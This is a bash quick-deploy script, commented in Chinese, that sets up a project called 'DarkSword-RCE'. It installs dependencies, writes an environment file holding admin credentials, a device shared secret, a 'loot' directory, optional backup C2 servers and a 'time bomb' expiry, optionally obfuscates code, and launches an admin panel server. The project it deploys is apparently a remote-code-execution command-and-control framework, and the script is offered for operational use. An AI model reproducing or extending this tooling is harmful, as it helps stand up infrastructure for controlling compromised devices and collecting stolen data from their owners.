#!/bin/bash
#
# quick_deploy.sh — 快速部署脚本
#
# 用途：一键配置环境变量、部署增强功能、启动服务
#
# 使用方法：
#   chmod +x scripts/quick_deploy.sh
#   ./scripts/quick_deploy.sh

set -e  # 遇到错误立即退出

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

echo -e "${MAGENTA}"
echo "═══════════════════════════════════════════════════════════"
echo "  DarkSword-RCE 快速部署脚本"
echo "═══════════════════════════════════════════════════════════"
echo -e "${NC}\n"

# ═══════════════════════════════════════════════════════════════════════════
# 1. 检查依赖
# ═══════════════════════════════════════════════════════════════════════════

echo -e "${BLUE}[1/6] 检查系统依赖...${NC}"

if ! command -v node &> /dev/null; then
    echo -e "${RED}❌ 未安装 Node.js${NC}"
    echo "请先安装 Node.js: https://nodejs.org/"
    exit 1
fi

if ! command -v openssl &> /dev/null; then
    echo -e "${RED}❌ 未安装 OpenSSL${NC}"
    exit 1
fi

echo -e "${GREEN}✅ 系统依赖检查通过${NC}\n"

# ═══════════════════════════════════════════════════════════════════════════
# 2. 安装 NPM 依赖
# ═══════════════════════════════════════════════════════════════════════════

echo -e "${BLUE}[2/6] 安装 NPM 依赖...${NC}"

if [ ! -d "node_modules" ]; then
    npm install
    echo -e "${GREEN}✅ 依赖安装完成${NC}\n"
else
    echo -e "${GREEN}✅ 依赖已存在${NC}\n"
fi

# ═══════════════════════════════════════════════════════════════════════════
# 3. 生成环境变量（如果不存在）
# ═══════════════════════════════════════════════════════════════════════════

echo -e "${BLUE}[3/6] 配置环境变量...${NC}"

ENV_FILE=".env"

if [ ! -f "$ENV_FILE" ]; then
    echo -e "${YELLOW}⚠️  未找到 .env 文件，正在生成...${NC}"
    
    # 生成随机凭据
    ADMIN_USERNAME="admin"
    ADMIN_PASSWORD=$(openssl rand -base64 32 | tr -d '/+=' | head -c 24)
    SHARED_SECRET=$(openssl rand -hex 32)
    
    cat > "$ENV_FILE" <<EOF
# DarkSword-RCE 环境配置
# 生成时间: $(date)

# 管理员凭据
DS_USERNAME=${ADMIN_USERNAME}
DS_PASSWORD=${ADMIN_PASSWORD}

# 设备共享密钥（通信加密）
DS_SHARED_SECRET=${SHARED_SECRET}

# 服务端口
DS_PORT=8888
DS_HOST=0.0.0.0

# 会话超时（毫秒，默认4小时）
DS_SESSION_TTL_MS=14400000

# 战利品存储目录
DS_LOOT_DIR=./loot

# CORS 白名单（逗号分隔，留空则禁用）
DS_CORS_WHITELIST=

# 备用 C2 服务器（可选）
# DS_BACKUP_C2_1=https://backup1.example.com
# DS_BACKUP_C2_2=https://backup2.example.com

# 时间炸弹（可选，格式: 2027-12-31T23:59:59Z）
# DS_EXPIRY_DATE=

EOF
    
    echo -e "${GREEN}✅ 已生成 .env 文件${NC}"
    echo -e "${YELLOW}⚠️  重要：请妥善保存以下凭据！${NC}\n"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "管理员用户名: ${GREEN}${ADMIN_USERNAME}${NC}"
    echo -e "管理员密码:   ${GREEN}${ADMIN_PASSWORD}${NC}"
    echo -e "共享密钥:     ${GREEN}${SHARED_SECRET:0:16}...${NC} (已截断)"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    read -p "按回车键继续..."
else
    echo -e "${GREEN}✅ 已存在 .env 文件${NC}"
fi

# 加载环境变量
export $(cat "$ENV_FILE" | grep -v '^#' | xargs)
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# 4. 运行部署脚本
# ═══════════════════════════════════════════════════════════════════════════

echo -e "${BLUE}[4/6] 运行增强功能部署脚本...${NC}"

if [ ! -f "scripts/deploy_enhanced.js" ]; then
    echo -e "${RED}❌ 未找到 deploy_enhanced.js${NC}"
    exit 1
fi

# 询问是否混淆代码
read -p "是否启用代码混淆？(y/N): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    node scripts/deploy_enhanced.js --obfuscate
else
    node scripts/deploy_enhanced.js
fi

echo ""

# ═══════════════════════════════════════════════════════════════════════════
# 5. 创建目录结构
# ═══════════════════════════════════════════════════════════════════════════

echo -e "${BLUE}[5/6] 创建目录结构...${NC}"

mkdir -p "$DS_LOOT_DIR"
mkdir -p logs

echo -e "${GREEN}✅ 目录创建完成${NC}\n"

# ═══════════════════════════════════════════════════════════════════════════
# 6. 完成提示
# ═══════════════════════════════════════════════════════════════════════════

echo -e "${BLUE}[6/6] 部署完成！${NC}\n"

echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}🎉 DarkSword-RCE 增强版部署成功！${NC}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

echo "下一步操作："
echo ""
echo "1️⃣  启动服务器:"
echo "   node server/admin_server.js"
echo ""
echo "2️⃣  访问管理面板:"
echo "   http://localhost:${DS_PORT}/admin"
echo "   用户名: ${DS_USERNAME}"
echo "   密码:   (见上方输出或 .env 文件)"
echo ""
echo "3️⃣  查看完整文档:"
echo "   cat ENHANCEMENT_GUIDE.md"
echo ""
echo "4️⃣  后台运行（可选）:"
echo "   nohup node server/admin_server.js > logs/server.log 2>&1 &"
echo ""

# 询问是否立即启动
read -p "是否立即启动服务器？(y/N): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo -e "\n${GREEN}正在启动服务器...${NC}\n"
    node server/admin_server.js
else
    echo -e "\n${YELLOW}稍后可手动启动: node server/admin_server.js${NC}\n"
fi